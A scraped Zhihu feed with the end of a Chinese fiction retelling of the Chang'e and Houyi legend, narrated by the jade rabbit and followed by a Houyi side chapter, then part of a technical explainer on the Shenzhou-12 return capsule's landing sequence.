月影晃晃，天幕幽幽，长阶之上，缓缓出现了一道身影，站立的姿态，像极了一面旗帜，迎风招展。</p>\n<p>“将军，您来了。”我惊得立马弹跳起来，手中的月饼也掉了一大块，心疼极了。</p>\n<p>后羿“嗯”了一声，坐在了我原来的位置上，拿起一块月饼放在嘴里。</p>\n<p>“金黄饱满，皮薄馅靓，口感丰厚，人间何寻。”</p>\n<p>“将军，这是小姐亲手做的，正准备叫您来尝尝。”</p>\n<p>嫦娥瞪了我一眼，这哪是给他做的，明明是用来堵我的嘴的。</p>\n<p>后羿看着嫦娥，浅色的瞳孔里映着剔透的光，那光里，藏着细细碎碎的欲。</p>\n<p>“从前是我轻怠了你。”</p>\n<p>“将军，我们是夫妻，不必如此生分。”</p>\n<p>看着后羿揽着嫦娥往屋里走，我心里的石头总算是落地了，想起新婚之夜，听到隔壁房传来男女欢好的声音，她整个脸变得异常惨白，斜靠在床头，像一具行尸走肉。</p>\n<p>幸好，嫦娥姐姐这一趟，没有白来。</p>\n<p>-8-</p>\n<p>将军中午在嫦娥房里用膳，突然来了一个下人在门外禀报。</p>\n<p>“恭喜将军，清水夫人已有两月身孕。”</p>\n<p>“真的？我去看看她。”</p>\n<p>说完，后羿就跟着仆人走了，全然忘了他身旁的人。</p>\n<p>我看向嫦娥，发现她身子微微一震，刚刚还谈起的话题，余下的全部卡在喉咙里，所有的伪装，因为这云淡风轻的几句话，开始出现裂痕。</p>\n<p>“小玉，你帮我去库房里拿那支千年人参给她补身子吧。”</p>\n<p>“姐姐，那支可名贵着呢，夫人是留着给你用的，随便打发她点什么不就行了。”</p>\n<p>“别说了，去吧。”</p>\n<p>我极不情愿地取了那支人参，交给清水的丫鬟时，恨不得直接扔到地上。转身想走，偏偏清水叫住了我。</p>\n<p>“姐姐可真大方，这么名贵的药材也愿意赠予我。”</p>\n<p>“小姐向来大方，对于相国府来说，区区千年人参，何足挂齿，夫人安心享用吧。”</p>\n<p>说完这句话连我都佩服自己，终于学会了人类语言的艺术。</p>\n<p>可到了晚上，一大群士兵冲进房里，把我和嫦娥团团围住，我紧紧地把嫦娥护在身后。</p>\n<p>最后一个进来的，是后羿。</p>\n<p>他的神情，就像我第一次看见他那样孤冷，无悲无喜。</p>\n<p>“把小玉抓起来，送到地牢审讯。”</p>\n<p>什么？抓我？</p>\n<p>“将军冤枉啊，小玉不知道做错了什么？”我吓得拼命挣扎。</p>\n<p>“清水的孩子没了，就是吃了你送过去的人参。”</p>\n<p>嫦娥也呆住了，“不可能，小玉不会做这种事的。”</p>\n<p>“小姐，我没有。”</p>\n<p>任凭嫦娥如何哀求，后羿都没有改变主意，把我丢进了阴暗潮湿的地牢里。</p>\n<p>而且，没有任何的审讯，两个彪形大汉，对我上来就是一顿毒打。</p>\n<p>我无处可逃，只能蜷缩在角落里，背上挨着一鞭又一鞭无情的鞭挞。我紧紧地抓住胸前服，强忍着不叫出声来。因为我知道，嫦娥姐姐就在与我一墙之隔的位置陪着我。</p>\n<p>整整三天，我被他们打得浑身上下没有一块好肉，连躲起来的力气都没有了，身子像被死死地钉在了地上，动弹不得。</p>\n<p>此时此刻，我多么希望回天庭，当一只乖巧的玉兔不好吗？为什么非要来人间遭这种罪？</p>\n<p>当我就快要昏死过去的时候，仿佛看到了嫦娥姐姐的影子。</p>\n<p>“小玉，你醒醒，别睡了。”嫦娥用力地拍我的脸。</p>\n<p>“姐姐，你终于来了，我没有害过清水。”</p>\n<p>“我知道，你不会这么做的。”</p>\n<p>“可当真是姐妹情深啊。”后羿的声音在地牢里被无限放大，撞击到墙壁产生的回响，就像一声声魔鬼的召唤。</p>\n<p>他站在台阶之上，宛若一个世界的主宰，居高临下地看着我们。</p>\n<p>“你要怎么样才肯放过小玉？”</p>\n<p>“我要你嫁给西凉王。”</p>\n<p>后羿的声音在空旷的地牢里，仿佛变成了有重量的实体，重重地压在了嫦娥的身上。</p>\n<p>我看着她，就这么猝不及防地倒了下来，随之倒下的，还有她的信念和那颗跳动了千年的心。</p>\n<p>“我给你三天时间，三天后给我答复。”</p>\n<p>-9-</p>\n<p>到了深夜，没想到还有一个不速之客来访。</p>\n<p>“姐姐，想不到你竟落到了这般田地。”清水还是那一副人畜无害的样子，让我看了就想咬她。</p>\n<p>“你真以为能把他从我身边夺走吗？若不是你从中作梗，我们早已是夫妻，他看中的，不过是你父亲手中的权势而已，如今你父亲，他已自身难保，更顾不上你了，你就乖乖的替我远嫁西凉吧。”</p>\n<p>我之前听下人们说过，西凉王今年已经七旬有余，有算命的说，倘若他能在明年大寿上为国家求得一位使女为自己冲喜，则能延年益寿。明知是江湖术士的胡言，可西凉王偏偏信得不行，派人来大乾国求亲，虽说皇帝还没有正式答应，可为了两国邦交，背地里已经安排相国大人开始物色美人了。</p>\n<p>全国女子不少，可若称得上绝色的，那真是凤毛麟角。</p>\n<p>其中最有名气的，便是相国大人的千金苏素素和怀化大将军的幺妹柳清水。</p>\n<p>相国大人自然是不愿意女儿远嫁的，他更希望借助姻亲关系拉拢后起之秀后羿，巩固自己的地位。</p>\n<p>可他没想到的是，怀化大将军竟是后羿的老师，将他从一个马前卒，一步步提升到大将军的位置上。</p>\n<p>怀化大将军在年初被查出贪污巨额军饷的罪名，全家三十多口人全部问斩，除了柳清水当时在外地，逃过一劫。可偏偏又落在了相国大人的手里，作为要挟后羿娶苏素素的筹码。</p>\n<p>就在大婚当日，趁着相国府兵力松懈，后羿手下的暗士偷偷救出了柳清水，并且让清水和苏素素同一天嫁进了将军府，真是让相国府人财两空，可本身非法囚禁清水就是死罪，这事也只能打落牙齿和血吞。</p>\n<p>选人期限将至，相国大人却无法交出美人，不少官员以此为借口弹劾他贪图美色、霸占美人，牵一发而动全身，以往的罪名全都被翻了出来。</p>\n<p>“所以为了逼我答应远嫁，你宁愿牺牲自己的孩子？”</p>\n<p>“他以正妻之位允诺我，我为何不答应？”</p>\n<p>我看向嫦娥，她就瘫坐在那黯淡的烛光之下，惨白的光笼罩着她娇小的身躯，显得落寞而苍白。</p>\n<p>“你告诉后羿，我答应去西凉。”</p>\n<p>一字一句，无情而坚定。</p>\n<p>后羿很快赶来，他不可思议地看着嫦娥：“你这么快就想好了吗？”</p>\n<p>“是的，但我有一个条件。”</p>\n<p>“哼，我就知道你不会这么心甘情愿地去，说吧。”</p>\n<p>“我要一份和离书，用嫦娥的名字。”</p>\n<p>“嫦娥？”后羿紧紧地盯着她，喉结滚动，眼瞳幽深。</p>\n<p>过了一会，还是命人取来了纸笔，写下了和离书。</p>\n<p>愿娘子相离之后，重梳婵鬓，美扫娥媚，巧呈窈窕姿，选聘高官之主。解怨释结，更莫相憎；一别两宽，各生欢喜。</p>\n<p>“好一个一别两宽，各生欢喜。”嫦娥拿着和离书，发疯般地笑了起来，前世的恩恩怨怨，或许都该了解了吧。</p>\n<p>-10-</p>\n<p>可笑的是，护送嫦娥出嫁的，竟然是后羿。</p>\n<p>送嫁的场景和嫦娥出嫁那天一模一样。</p>\n<p>十里红妆，送亲的马车从街头排到了街尾，井然有序，百姓们一个个都伸长了脑袋，想一睹绝色美人的风采。</p>\n<p>唯一不同的，是花轿里美人的心境。</p>\n<p>一次是嫁给心爱之人，另一次却是被心爱之人逼迫远嫁。</p>\n<p>大街上热闹非凡，人头攒动，花轿内美人如玉，内心寸草不生。</p>\n<p>临近西凉边界的时候，明显发现周围百姓的服饰与我们不同，深深的陌生和恐惧感袭来。</p>\n<p>去西凉皇宫的前一晚，我和嫦娥打算去草原看月亮。</p>\n<p>没想到后羿也在，看到我们来了，他便急着离开。</p>\n<p>“等等，如今我与你再无瓜葛，你不必对我有任何的愧疚之心。”嫦娥缓缓说道，神情如玉雕般失了七情六欲。</p>\n<p>“我只是想最后问你一句，于你而言，我到底是个什么样的存在？”</p>\n<p>后羿站在月光下，低着头，久久没有回应。</p>\n<p>“路人。”</p>\n<p>“好，不管是前世还是今生，你我夫妻情分已尽。”说罢，嫦娥拉着我大步往前走。</p>\n<p>等彻底走远了，她就一个人坐在地上，呆呆地望着月亮。</p>\n<p>突然，她说：“没事的，小玉。”</p>\n<p>怎么会没事呢，她在月亮上满怀希望地等了上千年，几乎将后羿刻烙在了她的生命里，烫得她血肉模糊，好不容易下凡来，可偏偏又是这样的结局，刚好的伤疤又被无情揭开，渐渐溃烂流血，淌出一道道脓水，仿佛都在嘲笑她，讽刺她。</p>\n<p>-11-</p>\n<p>大乾国为表诚意，特意安排美人编排了一支月光舞送给西凉王。</p>\n<p>嫦娥姐姐自然就是主角了。</p>\n<p>她一身素色舞衣，头埋在长长的水袖下，乐声起，水袖猛然甩开，如天仙般的脸庞展现在众人面前。西凉国大王和臣子，无一不拍手称赞。</p>\n<p>接着她踏着碎步往后退了几步，飞快地旋转起圈来，水袖随身起舞，一边旋转一边慢慢飞起，在空中定格，如仙如幻。</p>\n<p>我正看得痴迷，忽然，感觉到身体一阵炽热，有一种要被挤扁的痛感。</p>\n<p>恍惚间，世界在我眼前急剧缩小，我的视野能看到的，不再是宴会上的歌舞升平，而是黑暗而肮脏的桌底。</p>\n<p>我又变回兔子了吗？</p>\n<p>一曲舞毕，大殿上掌声四起，惊赞之声不绝于耳。</p>\n<p>“大乾国果然慷慨，送来如此绝色的美女，两国日后定永结秦晋之好，不起战事。”西凉王盯着嫦娥大为赞叹。</p>\n<p>“谢陛下，西凉国和大乾国是友好邻邦，愿两国国泰民安，陛下身体康健。最后让小女再为陛下献上一曲吧。”</p>\n<p>说罢，嫦娥轻舒长袖，娇躯随之旋转，越转越快。数百名美女围成几圈，玉手挥舞，百条红色绸带轻扬而出，泛起红色波涛。</p>\n<p>我看准时机，一跃而上，嫦娥稳稳地接住我，凌空飞到绸带之上，纤足轻点，宛若凌波仙子，朝大殿门口飞去，而后直奔月亮。</p>\n<p>大殿里的人突然都涌了出来，我远远地望着，稀稀疏疏地听到大家在喊“仙女奔月了，仙女奔月了”。</p>\n<p>我往嫦娥的怀里蹭了蹭，久违的温暖，人间之旅，终于划上了句号。</p>\n<p>-12-</p>\n<p>飞奔上天，嫦娥始终没有回头看过一眼，回到广寒宫，她变得比以往更冰冷孤傲。</p>\n<p>又是一年中秋佳节，嫦娥一个人去了月亮。</p>\n<p>我小心翼翼地旁边窝着，静静地看着她。</p>\n<p>她掏出怀里的那封和离书，把里面的每一个字，反复看了许久。</p>\n<p>“撕拉”一声，和离书在她手中成了一块块碎片，她往上一抛，随风飘散。</p>\n<p>我想，她真的放下了。</p>\n<p>曾经有一个人像杂草一样顽强地存在于她的生命里，哪怕历经千年也忘不掉、舍不得，如今拔出，那当真是割肉腕骨般的疼。</p>\n<p>幸好，我只是兔子，没有那么多的七情六欲。</p>\n<p>人类啊，中秋节，你们都要团团圆圆。</p>\n<hr>\n<p><b>后羿番外</b></p>\n<p>嫦娥奔月了。</p>\n<p>为什么这一幕，我竟觉得如此熟悉。</p>\n<p>她不是苏素素，从我迎娶她的那一天，我就感觉到了。</p>\n<p>她上花轿的时候滑倒了，我悄悄地在她耳边说：“恭喜你，以后你的生活会生不如死。”</p>\n<p>她没有我意料中的大吵大闹，当场和我反目，而是和我说：“后羿，我不是她。”</p>\n<p>一直以来，我都把清水当成自己的妹妹看待，愿意娶她，只是希望能够保护她，让相国大人不敢打她的主意。</p>\n<p>新婚之夜，我对清水说：“你能帮我个忙吗？”</p>\n<p>她点点头。</p>\n<p>接着我做了这辈子最可笑的一件事，美人在怀，我居然在她的床上做俯卧撑，仅仅只是为了气隔壁的女子。</p>\n<p>按她的性子，定会把事情闹大，我就顺势把她爹私藏清水抖出来，治他们全家的罪。</p>\n<p>可我没想到，她居然不吵不闹，我连续三个月不见她，她没有和家里有任何抱怨。听仆人说，清水敬茶那天故意挑衅她，她也没有生气，反倒和和气气地忍了。</p>\n<p>我开始真的怀疑，这是我认识的那个刁蛮跋扈的苏素素吗？</p>\n<p>我派人日夜监视着她的院子，终于有一天，相国夫人来了，侍卫告诉我，她没有说我一句不是，反而一直在帮我说话。</p>\n<p>想起新婚那天，她说她不是她，那她到底是谁的呢？</p>\n<p>她说，她叫嫦娥。</p>\n<p>我想了许久，这到底是谁呢？明明这个名字我从未听过，可为什么我喊的时候，竟然有种莫名的熟悉感。</p>\n<p>中秋节那天，清水邀请我去她的房里，我明白她的心意，可是，对于她的照顾我也仅限于此，我没有办法糟蹋她的一生，等西凉国的事情结束了，我就还她自由。</p>\n<p>仆人告诉我，按照规矩，中秋节应该是去夫人那过夜的。</p>\n<p>可我等了半天，连个人影都没见着，于是我就自己去了。</p>\n<p>没想到，她和小玉两个人还过得挺欢，两人在凉亭里吃着月饼、赏着月，压根就没想过要来找我的意思。</p>\n<p>我也不知道为何，鬼使神差地走了进去，尝了一口月饼，还挺好吃的。</p>\n<p>那天的她，在月光下特别好看，肌肤如雪，一颦一笑，撩拨人心。</p>\n<p>那天晚上，我不去想我们之间曾发生过什么事，我只想记住，她是我后羿的妻子，嫦娥。</p>\n<p>使女选拔的日子越来越近了，相国大人既不愿意把自己女儿交出去，又失去了清水这个替代品，一时间朝廷上上下下议论纷纷。</p>\n<p>我暗地里联合了几位大臣上书皇帝，请求彻查相国大人的以往罪行，帮恩师和清水翻案，还他们清白之身。</p>\n<p>谁知，相国为了自保，竟向皇帝表明愿意献出自己的女儿，以平息舆论。皇帝看在他一片诚心的份上，恩准他告老还乡。</p>\n<p>我重重打了他一拳，他很不服气，“若不是你放走了清水，还联合大臣弹劾我，我会这样做吗？”</p>\n<p>他的话就像一把锤子，把我的心敲得稀烂。</p>\n<p>是啊，是我把她逼到这份上的。</p>\n<p>既然如此，那么我就一做到底吧，与其记恨曾经给过她温暖的家人，不如恨我。</p>\n<p>我知道她在府里和小玉的感情最好，于是我让清水假装怀孕流产，以小玉的性命来要挟她。</p>\n<p>出乎意料的是，她竟然答应了。</p>\n<p>明明达到了目的，可我的心却闷闷地疼。</p>\n<p>嫦娥要去西凉了，我与她不过数月夫妻，天下女子何其多，我为何要执着于她一个呢？</p>\n<p>可是，我的心却不听差使。</p>\n<p>我向皇帝请辞，恳求让我最后送嫦娥一程。</p>\n<p>皇帝震怒，骂我为了一个女子放弃了大好前程，我也想不明白自己为什么要这么做，可心异常坚定。</p>\n<p>“如果没有她，我不知道要这功名做什么。”</p>\n<p>皇帝挥挥手，“罢了，随你去吧。”</p>\n<p>送亲的路上，我不敢见她，害怕看见她，就忍不住带她走的冲动。</p>\n<p>在路上，她问我，于我而言，她到底是个什么样的存在。</p>\n<p>我想说，你当然是我的爱人啊。</p>\n<p>可是转念一想，哪有将爱人转手送给其他人的丈夫呢？</p>\n<p>我不配。</p>\n<p>于是我说：路人。</p>\n<p>简单的两个字，把我们的未来彻底堵死，斩断了夫妻情分。</p>\n<p>当天在宴会上，我早已安排了一位身形与她相近的女子，上百名舞女人多混乱，衣服颜色又极为相近，只要现场发生状况，我再伺机将她调换出来。</p>\n<p>可是，当我还没来得及动手，她竟然飞走了。</p>\n<p>我一直望着她，可她从未回头看我一眼。</p>\n<p>是我不值得吧。</p>\n<p>人有悲欢离合，月有阴晴圆缺，此事古难全。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/gong-yang-jun-42?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">蘑菇君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484001869/answer/2119100364?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">211 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/360227471?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">嫦娥和玉兔会有什么日常呢？</a><br><a href=\"http://www.zhihu.com/question/35974811?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">后羿能射下9个太阳，为什么老婆背叛他跑到月亮上了，嫦娥不怕被射下来么？后羿为什么不射呢？</a><br>\n","link":"http://www.zhihu.com/question/484001869/answer/2119100364?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"神舟十二号 3 名航天员即将按计划返回着陆在东风着陆场，过程会是怎样？你有何期待？","date":"2021-09-16 05:56:49","description":"\n<h2>【20210916追更】神舟十二号载人飞船撤离空间站组合体</h2>\n<p>北京时间2021年9月16日8时56分，神舟十二号载人飞船与空间站天和核心舱成功实施分离。截至目前，神舟十二号航天员乘组已在空间站组合体工作生活了90天，刷新了中国航天员单次飞行任务太空驻留时间的纪录。分离前，航天员乘组在地面科技人员的配合下，完成了空间站组合体状态设置、实验数据整理下传、留轨物资清理转运等撤离前各项工作。</p>\n<h2>【20210914】过程如何？搞懂神舟十二号载人飞船返回着陆的7件事（原创工程版，有点长，慢慢看），就明白了。</h2>\n<p>        自2021年6月17日发射升空以来，神舟十二号任务的3名航天员聂海胜、刘伯明、汤洪波，即将圆满完成在轨90天的驻留任务，过程中相继完成了进驻、货船及核心舱物资收纳管理、在轨设备开机调试状态设置试验、两次出舱活动安装了全景相机支架及安装了扩展泵组、大量的在轨科学实验仪器设备展开试验、身体健康及医学监测等任务，经评估，全部预定任务超额完成，即将进入任务的返回着陆段工作。载有“太空3人组”的太空老帅航天员的返回舱即将要返回地球·中国·酒泉！（飞船的主着陆场是酒泉东风着陆场。)<br><b>载人飞船的返回着陆技术，是载人航天工程的3大关键技术之一</b>。<br>这其中，知道了以下七方面的内容，会有助于更好的理解整个极具挑战、惊心动魄的航天员及载人飞船返回着陆过程。</p>\n<h2>\n<br><b>第一件事：航天员和载人飞船返回着陆到底是个什么样的过程，何时开始？何时结束？ 阶段划分？</b>\n</h2>\n<p><br>将大象放到冰箱需要3步，航天员从天和核心舱返回着陆回到酒泉主着陆场，技术上需要五个步骤（阶段）。</p>\n<ol>\n<li><b>分离撤离；</b></li>\n<li><b>制动离轨；</b></li>\n<li><b>惯性滑行；</b></li>\n<li><b>再入大气层；</b></li>\n<li><b>着陆。</b></li>\n</ol>\n<p><img src=\"https://pic4.zhimg.com/v2-dd8a3fe9e7183b547f85158f0f6b1461_720w.jpg?rss\" data-rawwidth=\"650\" data-rawheight=\"421\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3><b>1 分离撤离段</b></h3>\n<ul>\n<li>确定归期后，航天员开始撤离前的各项准备工作：</li>\n<li>物品的转移和整理，</li>\n<li>天和舱设备状态设置，</li>\n<li>神舟十二号载人飞船设置，</li>\n<li>货船设备舱门设置，</li>\n<li>天和核心舱舱门设置，</li>\n<li>货运飞船与核心舱对接通道泄压，</li>\n<li>关闭货船舱门，</li>\n<li>关闭天和舱舱门，</li>\n<li>关闭节点舱舱门，</li>\n<li>航天员进入神舟十二号，穿舱内压力服，</li>\n<li>关闭神舟十二号轨道舱前舱门，</li>\n<li>对接通道泄压，</li>\n<li>关闭神舟十二号返回舱舱门</li>\n<li>然后分离！！！</li>\n</ul>\n<h3>2 制动离轨段（~400公里，一般在15圈左右）</h3>\n<p><br>这次的神舟十二号飞船具备从不同高度轨道返回着陆场的能力。神舟团队对返回轨道进行了适应性设计，使载人飞船返回高度从固定值调整为相对范围，并改进返回算法，提高载人飞船返回适应性和可靠性哟。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8177f303f197cb303e2314b4b93b6a5f_720w.jpg?rss\" data-rawwidth=\"590\" data-rawheight=\"680\" data-size=\"normal\" data-caption=\"神舟飞船标准模型\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>请先看图，然后看下文......<br>飞船通过调姿、制动、减速，从原飞行轨道进入返回轨道的阶段称制动离轨段。<br><b>第一次调姿：</b>返回前，飞船首先要调整姿态，使飞船在水平方向逆时针转动90°，由轨道舱在前、返回舱居中、推进舱在后的状态变为横向飞行状态，这是飞船的第一次调姿。<br>轨返分离：轨道舱与返回舱以每秒1～2米的相对速度分离。此时，飞船变成了推进舱和返回舱的组合体。<br><b>第二次调姿：</b>在接收到轨道舱与返回舱分离压点开关闭合信号后，数管将返回时设置成零秒，程控与遥控发第二次返回调姿指令，GNC控制返回－推进舱绕偏航轴继续逆时针转90°；正常情况下GNC在制动开始前１s进行导航计算，GNC 设置返回时为零秒。直白的说是：两舱组合体继续逆时针转过90°，变成推进舱在前、返回舱在后的飞行状态，同时再调整俯仰角达到制动要求，这是飞船的第二次调姿。<br><b>减速变轨：</b>程控按地面注入时间发动变轨发动机A1、A3点火工作，遥控开机由地面判发；GNC按速度增量关机，程控按地面注入时间关机，遥控关机由地面判发。直白的说是：飞船推进舱上的发动机点火工作，产生与飞船飞行方向相反的作用力，使飞船飞行速度降低，从而脱离原飞行轨道进入返回轨道，这个制动过程可比喻为“刹车”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-17aa7d27bfbc4a03e61ce391806989c6_720w.jpg?rss\" data-rawwidth=\"691\" data-rawheight=\"1833\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3><b>3 惯性滑行阶段（~145公里）</b></h3>\n<p><br>飞船从离开原运行轨道到进入大气层之前，空气阻力很小，主要是在地球引力的作用下呈自由飞行状态，因此，这个阶段称为惯性滑行段或者自由下降段。在这个飞行阶段，飞船按照计划要完成推进舱分离、建立再入攻角姿态等重要飞行事件。<br>即：飞船制动结束后，进入惯性滑行飞行，（飞行时间约16分钟，有地面测控区覆盖）；当飞行高度降低至约<b>145公里高度</b>时，开始进行返回舱与推进舱的分离程序；两舱分离后，GNC消除返回舱姿态分离干扰，建立并保持再入飞行所需的配平姿态。<br>推返分离：最后一圈时，推进舱和返回舱按计划分离，由于飞船上的图像是通过推进舱天线发回的，因此抛掉推进舱后，飞船图像将会中断。当地面光学设备再次捕获返回舱图像后，地面才会重新获取。同时，推进舱再入大气层后烧毁。<br><br><br><b>再入攻角建立：</b>返回舱建立正确的再入姿态角（速度方向与当地水平面的夹角）是一项重要的工作，这个角度必须精确地控制在一定的范围内，如果角度太小，飞船将从大气层边缘擦过而不能返回；如果角度太大，飞船返回速度过快，将像流星一样在大气层中被烧毁。</p>\n<h3>\n<br>4 再入段（~100公里）</h3>\n<p><br>从返回舱进入稠密大气层到其回收着陆系统开始工作的飞行阶段称为再入段。<br>此阶段GNC开始再入升力返回控制，直至20km高度结束；升力控制结束后，GNC使返回舱的倾侧角保持为0°（Ⅲ象限朝上），俯仰、偏航通道按速率阻尼模式稳定，直至10km高度开伞点，在飞行高度约50km时GNC给回收加电，数管按照规定时间给回收加电，航天员根据提示手动给回收加电。（判据：当返回舱轴向过载达到规定指标时，返回舱实施升力控制，使返回舱过载不超出航天员所能承受的范围，并且用升力控制来控制返回舱落点位置，使返回舱返回预定着陆场。）<br>直白的说：再入大气层的高度一般为80～100千米。返回舱进入稠密大气层后，承受气动加热和再入过载，<b>是返回过程中环境最为恶劣的阶段</b>。随着高度的降低，空气密度越来越大，返回舱迎风面与空气剧烈摩擦，飞船表面和大气层摩擦产生巨大热量，使其底部温度高达数千摄氏度，返回舱周围被火焰所包围，在飞船表面形成高温等离子气体层，并对电磁波造成强烈的屏蔽效应，因此，接收不到地面发送的无线电信号，地面也接收不到返回舱发送的无线电信号，这个区域被称为无线电“黑障区”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-25127a73f577a00ddd7b3a23a5f9f5d4_720w.jpg?rss\" data-rawwidth=\"610\" data-rawheight=\"344\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这个区域的飞行高度约是80公里~35公里，飞行时间约240秒。直到距离地球约35公里处，黑障消失，地面测控部门重新捕获飞船。</p>\n<h3>\n<br>5 着陆段（~10km）<br><b>返回舱从打开降落伞到着陆这个过程称为着陆段。</b>\n</h3>\n<ul>\n<li>当返回舱降落至约10km高度时，回收着陆分系统的静压高度表（第Ⅰ组）接通回收着陆程序Ⅰ。</li>\n<li>接着，后弹掉主伞舱盖，拉出引导伞、减速伞，然后拉出主伞，拉出HF天线，短波通信机开始工作；使返回舱的速度缓缓下降，随着高度的降低和速度的减小，返回舱所受到的气动阻力与地球引力渐趋平衡，此时，返回舱的下降速度是大约每秒0.2公里的均速下降；</li>\n<li>着陆搜寻信标机（243MHz）在出现黑障后即开始工作。</li>\n<li>然后，抛掉防热大底，</li>\n<li>随后主伞改为垂直吊挂，同时进行剩余推进剂耗尽及贮箱、推进剂管路吹除，贮箱与推进剂管路中的残留推进剂用增压氦气瓶中的剩余气体吹除干净，以防在着陆冲击下管路或密封损坏时推进剂漏入返回舱内；之后，排放环控生保分系统的高压氧；</li>\n<li>返回舱下降至约10米高度时，γ高度计发出返回舱离地面10米信号；</li>\n<li>下降至高度约1~2米时，由γ高度计发出点燃着陆反推发动机信号，返回舱减速着陆；</li>\n<li>数管分系统依据着陆时回收着陆分系统程序控制器给出的着陆指令，开始执行一系列的着陆后处理工作程序，完成抛大底上和侧壁上的天线盖、弹出甚高频天线、展开高频天线等程序；</li>\n<li>着陆后，闪光灯、着陆搜寻信标机和国际救援示位标（406MHz）给出标位信息；</li>\n<li>航天员根据着陆点的状况及风速，决定是否脱掉主伞，如需脱主伞，则由航天员手控发脱主伞指令。然后等待救援回收人员到来。</li>\n</ul>\n<p><img src=\"https://pic1.zhimg.com/v2-8f996b43af90768ac4695fe2900089eb_720w.jpg?rss\" data-rawwidth=\"523\" data-rawheight=\"485\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2><b>第二件事：航天员安全着陆三大法宝是：降落伞 反推火箭 缓冲座椅</b></h2>\n<p><br>　　在神舟飞船返回着陆过程中，降低速度、减缓冲击是确保航天员生命安全的关键。飞船以数千米每秒的速度进入大气层，由于受到大气阻力的作用，速度会迅速下降。到距离地球表面１５公里左右的高度时，飞船所受到的空气阻力大体与飞船自身的重力相当，这时飞船的速度由超音速下降到亚音速，并稳定在２００米／秒左右。<br>　　如果飞船以这样的速度冲向地面，返回舱内航天员就如同从１００层高楼上飞身直下，其后果可想而知。这时就必须依靠降落伞将飞船的速度降下来。当返回舱下降到距地面大约１０公里的高度时，返回舱上的静压高度控制器通过测量大气压力判定高度，自动打开伞舱盖，首先带出引导伞，引导伞再拉出减速伞。此时返回舱速度大约为１８０米／秒左右，航天员将会受到很大的开伞冲击力。为了把冲击力减小，减速伞设计为两级充气，先张开一个小口，８秒后待返回舱速度减小到一定程度后，再全部张开。通过减速伞的作用，返回舱的速度下降到８０米／秒左右。<br>　　减速伞工作１６秒钟后，与返回舱分离，同时拉出主伞。主伞先也采取两级冲气的方法，先张开一个小口，然后慢慢地全部张开，这时返回舱的下降速度逐渐由８０米／秒减到４０米／秒，然后再减至８米——１０米／秒。<br>　　然而，飞船即使是以８米／秒的速度着陆，所受的冲击力可能将航天员的脊柱震断。这时，在飞船即将着陆的一瞬间--飞船距离地面大约１米时，安装在返回舱底部的４台反推火箭点火工作，使返回舱速度一下子降到２米／秒以内。<br>　　与此同时，具有缓冲功能的航天员座椅在着陆前开始自动提升。航天员座椅的前端，也就是航天员放置脚的部位固定在一个轴上；座椅的末端，也就是航天员的头部位置，可以在一定范围内上下活动。在飞船着陆前，如果自动提升程序出现故障，航天员也可以通过手工操作将座椅的末端提升２０厘米左右，从而使冲击的能量被缓冲吸收。为了最大限度地吸收冲击的能量，航天员座椅上还铺设了一套根据航天员身材量体定制的赋形缓冲坐垫。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-484bfff8f51fe43b25b86f90d56249dc_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"395\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为增加着陆的可靠性，返回舱上除装有主降落伞系统外，还装有面积稍小的备份降落伞系统。一旦主降落伞系统出现故障，可在规定高度应急启用，使返回舱安全着陆。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-caad6b29e493c72fce55ffbb9c3f71c7_720w.jpg?rss\" data-rawwidth=\"547\" data-rawheight=\"532\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>当然了，还有返回舱的防热设计、GNC系统等也是非常重要的关键系统。另文介绍。</p>\n<h2>\n<br>第三件事：着陆场有啥作用？</h2>\n<p><br>主要任务是为载人飞船返回舱选定安全的返回着陆场区，完成返回舱在返回着陆段的测控通信任务，搜索、寻找着陆后的返回舱，救援航天员，回收返回舱和有效载荷，并提供着陆场区的通信和气象保障服务。由主着陆场、副着陆场、陆上应急搜救、上升段海上应急搜救、通信和航天员医监医保六部分组成。<b>具有测控、搜救、通信和气象保障四大功能。</b><br><b>测控。</b>飞船返回舱距地面４０公里以后的测控是着陆场的任务，目的是测出返回舱的落点，指挥各区域的搜救力量前往搜救。测控细分为四项：一是外测，测量返回舱返回的轨迹，特别是出“黑障”区后的运动轨迹；二是遥测，感知和了解返回舱的运动状态和舱内环境，以及航天员的身体状态；三是遥控，由指挥人员给飞船发出指令，虽然这些指令只有一两条，但都事关航天员生命安全；四是实况监视，利用光学设备来拍摄飞船返回舱出“黑障”区及下降过程中的实况